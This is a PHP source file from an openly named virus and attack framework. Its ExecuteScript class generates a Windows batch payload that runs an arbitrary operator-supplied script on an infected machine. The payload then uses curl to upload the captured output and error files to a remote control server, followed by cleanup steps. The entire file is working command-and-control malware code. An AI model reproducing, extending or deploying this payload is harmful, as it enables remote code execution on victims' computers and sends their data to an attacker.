<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExecuteScript;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScriptWin;
use Kelvinho\Virus\Singleton\Header;

/**
 * Class ExecuteScript. Executes a random script
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class ExecuteScript extends AttackBase {
    private string $data = "";
    private string $script = "";
    private string $error = "";
    private array $extras = [];

    public function getScript(): string {
        return $this->script;
    }

    public function setScript(string $script): void {
        $this->script = $script;
    }

    public function getData(): string {
        return $this->data;
    }

    public function setData(string $data): void {
        $this->data = $data;
    }

    public function getError(): string {
        return $this->error;
    }

    public function setError(string $error): void {
        $this->error = $error;
    }

    /**
     * Extras are expected to be an array of the associative array {"identifier" => "{identifier}", "content" => "{contents}"}
     *
     * @return array
     */
    public function getExtras(): array {
        return $this->extras;
    }

    public function setExtras(string $extras) {
        $this->extras = json_decode($extras);
    }

    public function generateBatchCode(): void {
        //@formatter:off ?>
        chCp 65001
        echo _>"%~pd0data"
        echo _>"%~pd0err"
        <?php echo $this->script . "\n";
        echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        //@formatter:on
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl --form "dataFile=@%~pd0data" --form "errFile=@%~pd0err" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function processExtras(string $resourceIdentifier): void {
        foreach ($this->extras as $extra) {
            if ($resourceIdentifier === $extra["identifier"]) {
                echo $extra["content"];
                Header::ok();
            }
        }
        Header::notFound();
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->data = $state["data"];
        $this->script = $state["script"];
        $this->error = $state["error"];
        $this->extras = $state["extras"] ?? [];
    }

    protected function getState(): string {
        $state = [];
        $state["data"] = $this->data;
        $state["error"] = $this->error;
        $state["script"] = $this->script;
        $state["extras"] = $this->extras;
        return json_encode($state);
    }
}
